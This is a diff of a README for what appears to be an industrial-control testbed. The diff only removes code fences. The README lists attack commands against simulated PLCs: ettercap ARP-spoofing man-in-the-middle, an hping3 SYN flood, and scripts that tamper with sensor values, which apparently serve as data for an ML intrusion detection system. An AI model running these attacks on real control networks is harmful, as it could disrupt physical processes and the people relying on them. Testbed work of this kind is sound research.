@@ -55,38 +55,32 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
 
 **Attack scenario 2, 3, 4** (MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
 
-    ```
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 
-    ```
 
 **Attack scenario 5** (TCP SYN flooding)
 
-    ```
     hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1
-    ```
+
 
 **Attack scenario 6,7,8** (MitM/Data tampering): Run the following commands for attacks 6, 7, 8 respectively.
 
-    ```
     python attack_sensor_constant.py PLC2
     python attack_sensor_constant.py PLC3
     python attack_sensor_constant.py BOTH
-    ```
+
 **Attack scenario 9,10,11 (MitM/Scaling positive) and Attack scenario 12,13,14 (MitM/Scaling negative)
 
-    ```
     python attack_sensor_scaling.py PLC2 +
     python attack_sensor_scaling.py PLC3 +
     python attack_sensor_scaling.py BOTH +
     python attack_sensor_scaling.py PLC2 -
     python attack_sensor_scaling.py PLC3 -
     python attack_sensor_scaling.py BOTH -
-    ```
+
 **Attack scenario 15,16,17 (MitM/Data tampering)
 
-    ```
     python attack_sensor_random_withinlimits.py PLC2
     python attack_sensor_random_withinlimits.py PLC3
     python attack_sensor_random_withinlimits.py BOTH
@@ -94,14 +88,12 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
 
 **Attack scenario 18,19,20 (MitM/Scaling positive) and Attack scenario 21,22,23 (MitM/Scaling negative)
 
-```
 python attack_randomp.py PLC2
 python attack_randomp.py PLC3
 python attack_randomp.py BOTH
 python attack_randomn.py PLC2
 python attack_randomn.py PLC3
 python attack_randomn.py BOTH
-```
 
 **Running ML-based IDS**
 
